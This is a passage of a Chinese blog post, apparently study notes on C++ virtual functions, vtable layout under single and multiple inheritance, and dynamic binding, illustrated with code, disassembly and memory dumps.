…</p>\n<p>虚函数通过对象调用时和普通函数没有区别</p>\n<p>虚函数通过指针调用时是间接调用的</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Test</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> x;</span><br><span class=\"line\">    <span class=\"type\">int</span> y;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func1</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; <span class=\"string\">&quot;Hello World 111 !\\n&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">void</span> <span class=\"title\">func2</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; <span class=\"string\">&quot;Hello World! 222 \\n&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tTest t;</span><br><span class=\"line\">\tTest* pt = &amp;t;</span><br><span class=\"line\">\tpt-&gt;<span class=\"built_in\">func1</span>();</span><br><span class=\"line\">\tpt-&gt;<span class=\"built_in\">func2</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;Hello World!\\n&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401398</span> <span class=\"number\">8</span>D <span class=\"number\">4</span>D FC             lea         ecx,[ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040139B</span> E8 F1 FC FF FF       call        @ILT+<span class=\"number\">140</span>(Test::Test) (<span class=\"number\">00401091</span>)</span><br><span class=\"line\"><span class=\"number\">24</span>:       Test* pt = &amp;t;</span><br><span class=\"line\"><span class=\"number\">004013</span>A0 <span class=\"number\">8</span>D <span class=\"number\">45</span> FC             lea         eax,[ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">004013</span>A3 <span class=\"number\">89</span> <span class=\"number\">45</span> F8             mov         dword ptr [ebp<span class=\"number\">-8</span>],eax</span><br><span class=\"line\"><span class=\"number\">25</span>:       pt-&gt;<span class=\"built_in\">func1</span>();</span><br><span class=\"line\"><span class=\"number\">004013</span>A6 <span class=\"number\">8B</span> <span class=\"number\">4</span>D F8             mov         ecx,dword ptr [ebp<span class=\"number\">-8</span>]</span><br><span class=\"line\"><span class=\"number\">004013</span>A9 E8 <span class=\"number\">61</span> FC FF FF       call        @ILT+<span class=\"number\">10</span>(Test::func1) (<span class=\"number\">0040100f</span>)</span><br><span class=\"line\"><span class=\"number\">26</span>:       pt-&gt;<span class=\"built_in\">func2</span>();</span><br><span class=\"line\"><span class=\"number\">004013</span>AE <span class=\"number\">8B</span> <span class=\"number\">4</span>D F8             mov         ecx,dword ptr [ebp<span class=\"number\">-8</span>]</span><br><span class=\"line\"><span class=\"number\">004013B</span>1 <span class=\"number\">8B</span> <span class=\"number\">11</span>                mov         edx,dword ptr [ecx]</span><br><span class=\"line\"><span class=\"number\">004013B</span>3 <span class=\"number\">8B</span> F4                mov         esi,esp</span><br><span class=\"line\"><span class=\"number\">004013B</span>5 <span class=\"number\">8B</span> <span class=\"number\">4</span>D F8             mov         ecx,dword ptr [ebp<span class=\"number\">-8</span>]</span><br><span class=\"line\"><span class=\"number\">004013B</span>8 FF <span class=\"number\">12</span>                call        dword ptr [edx]</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"built_in\">sizeof</span>(Test) = <span class=\"number\">12</span>;</span><br><span class=\"line\">虚函数 + <span class=\"number\">4</span>字节，不管有多少虚函数，他指向一个数组，数组中存储对象中所有虚函数地址</span><br><span class=\"line\">虚函数表在对象的首地址，是一个四字节的地址 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230228161556184.png\" alt=\"image-20230228161556184\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Base</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tvirtual void func1()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;111\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func2()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;222\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func3()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;333\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">class Sub :Base</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvirtual void func4()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;444\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func5()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;555\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func6()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;666\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">//打印Sub虚函数表，画图</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Base* bp1 = &amp;base;</span><br><span class=\"line\">Base* bp2 = (Base*)&amp;sub;</span><br><span class=\"line\">printf(&quot;%X\\n&quot;,bp1);</span><br><span class=\"line\">printf(&quot;%X\\n&quot;,bp2);</span><br><span class=\"line\"></span><br><span class=\"line\">printf(&quot;%X\\n&quot;, *(((int*)bp1) + 0));</span><br><span class=\"line\">printf(&quot;%X\\n&quot;, *(((int*)bp1) + 1));</span><br><span class=\"line\"></span><br><span class=\"line\">printf(&quot;%X\\n&quot;, *(((int*)bp2) + 0));</span><br><span class=\"line\">printf(&quot;%X\\n&quot;, *(((int*)bp2) + 1));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">18FF44</span><br><span class=\"line\">18FF40</span><br><span class=\"line\">432020</span><br><span class=\"line\">18FF88</span><br><span class=\"line\">432048</span><br><span class=\"line\">432020</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">0018FF38  40 FF 18 00  @...  //sub</span><br><span class=\"line\">0018FF3C  44 FF 18 00  D...  //Base</span><br><span class=\"line\">0018FF40  48 20 43 00  H C.  //sub虚表</span><br><span class=\"line\">0018FF44  20 20 43 00    C.</span><br><span class=\"line\">0018FF48  88 FF 18 00  ....  //ebp</span><br><span class=\"line\"></span><br><span class=\"line\">00432020  05 10 40 00  ..@.</span><br><span class=\"line\">00432024  78 10 40 00  x.@.</span><br><span class=\"line\">00432028  96 10 40 00  ..@.</span><br><span class=\"line\">0043202C  00 00 00 00  ....</span><br><span class=\"line\">00432030  31 31 31 0A  111.</span><br><span class=\"line\">00432034  00 00 00 00  ....</span><br><span class=\"line\">00432038  32 32 32 0A  222.</span><br><span class=\"line\">0043203C  00 00 00 00  ....</span><br><span class=\"line\">00432040  33 33 33 0A  333.</span><br><span class=\"line\">00432044  00 00 00 00  ....</span><br><span class=\"line\">00432048  05 10 40 00  ..@.</span><br><span class=\"line\">0043204C  78 10 40 00  x.@.</span><br><span class=\"line\">00432050  96 10 40 00  ..@.</span><br><span class=\"line\">00432054  69 10 40 00  i.@.</span><br><span class=\"line\">00432058  C3 10 40 00  ..@.</span><br><span class=\"line\">0043205C  14 10 40 00  ..@.</span><br><span class=\"line\">00432060  00 00 00 00  ....</span><br><span class=\"line\">00432064  34 34 34 0A  444.</span><br><span class=\"line\">00432068  00 00 00 00  ....</span><br><span class=\"line\">0043206C  35 35 35 0A  555.</span><br><span class=\"line\">00432070  00 00 00 00  ....</span><br><span class=\"line\">00432074  36 36 36 0A  666.</span><br><span class=\"line\">00432078  00 00 00 00  ....</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tBase base;</span><br><span class=\"line\">\tSub sub;</span><br><span class=\"line\"></span><br><span class=\"line\">\tBase* bp1 = &amp;base;</span><br><span class=\"line\">\tBase* bp2 = (Base*)&amp;sub;</span><br><span class=\"line\"></span><br><span class=\"line\">\ttypedef void(*pFunc)(void);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpFunc ppp;</span><br><span class=\"line\"></span><br><span class=\"line\">\tppp = (pFunc)*((int*)(*(int*)(bp1)+0)+0);   //取值范围bp1+0+0 - bp1+0+2   111-333</span><br><span class=\"line\">\tppp = (pFunc)*((int*)(*(int*)(bp2)+0)+3);   //取值范围bp2+0+0 - bp2+0+5   111-666</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tppp();</span><br><span class=\"line\">\t</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230228181939235.png\" alt=\"image-20230228181939235\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Base</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tvirtual void func1()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;111\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func2()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;222\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func3()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;333\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">class Sub :Base</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvirtual void func1()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;sub:111\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func2()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;Sub:222\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func6()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;666\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">//打印Sub虚函数表，画图</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0018FF38  40 FF 18 00  @...  //sub</span><br><span class=\"line\">0018FF3C  44 FF 18 00  D...  //Base</span><br><span class=\"line\">0018FF40  48 20 43 00  H C.  //sub虚表</span><br><span class=\"line\">0018FF44  20 20 43 00    C.</span><br><span class=\"line\">0018FF48  88 FF 18 00  ....  //ebp</span><br><span class=\"line\"></span><br><span class=\"line\">0432020  0A 10 40 00  ..@.</span><br><span class=\"line\">00432024  7D 10 40 00  &#125;.@.</span><br><span class=\"line\">00432028  9B 10 40 00  ..@.</span><br><span class=\"line\">0043202C  00 00 00 00  ....</span><br><span class=\"line\">00432030  31 31 31 0A  111.</span><br><span class=\"line\">00432034  00 00 00 00  ....</span><br><span class=\"line\">00432038  32 32 32 0A  222.</span><br><span class=\"line\">0043203C  00 00 00 00  ....</span><br><span class=\"line\">00432040  33 33 33 0A  333.</span><br><span class=\"line\">00432044  00 00 00 00  ....</span><br><span class=\"line\">00432048  1E 10 40 00  ..@.</span><br><span class=\"line\">0043204C  3C 10 40 00  &lt;.@.</span><br><span class=\"line\">00432050  9B 10 40 00  ..@.</span><br><span class=\"line\">00432054  05 10 40 00  ..@.</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tBase base;</span><br><span class=\"line\">\tSub sub;</span><br><span class=\"line\"></span><br><span class=\"line\">\tBase* bp1 = &amp;base;</span><br><span class=\"line\">\tBase* bp2 = (Base*)&amp;sub;</span><br><span class=\"line\"></span><br><span class=\"line\">\ttypedef void(*pFunc)(void);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpFunc ppp;</span><br><span class=\"line\"></span><br><span class=\"line\">\tppp = (pFunc)*((int*)(*(int*)(bp1)+0)+0);   //取值范围bp1+0+0 - bp1+0+2   111-333</span><br><span class=\"line\">\tppp = (pFunc)*((int*)(*(int*)(bp2)+0)+3);   //取值范围bp2+0+0 - bp2+0+3   sub111-sub222-333-666</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tppp();</span><br><span class=\"line\">\t</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>多继承</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class A</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvirtual void func1()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;111\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func2()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;222\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class B</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvirtual void func3()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;333\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func4()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;444\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class C:A,B</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvirtual void func5()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;555\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func6()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;666\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">sizeof(C) = 8;</span><br><span class=\"line\">有几个直接分类就有几个虚函数表</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230301140806277.png\" alt=\"image-20230301140806277\"></p>\n<p>多重继承有覆盖</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class A</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvirtual void func1()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;111\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func2()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;222\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class B</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvirtual void func3()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;333\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func4()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;444\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class C:A,B</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvirtual void func1()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;sub:555\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func3()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;sub:666\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t\tvirtual void func7()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;77\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">sizeof(C) = 8;</span><br><span class=\"line\">有几个直接分类就有几个虚函数表</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class A</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvirtual void func1()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;111\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func2()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;222\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class B:A</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvirtual void func3()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;333\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func4()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;444\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class C: B</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tvirtual void func5()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;555\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvirtual void func6()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; &quot;666\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"动态绑定\"><a class=\"markdownIt-Anchor\" href=\"#动态绑定\">#</a> 动态绑定</h3>\n<p>编译器确定的成为前期或者编译器绑定</p>\n<p>调用时再知道地址的成为运行期绑定 / 动态绑定 / 晚绑定</p>\n<p>成员变量和普通的成员函数时编译时绑定</p>\n<p>virtual 函数时动态绑定，call 是 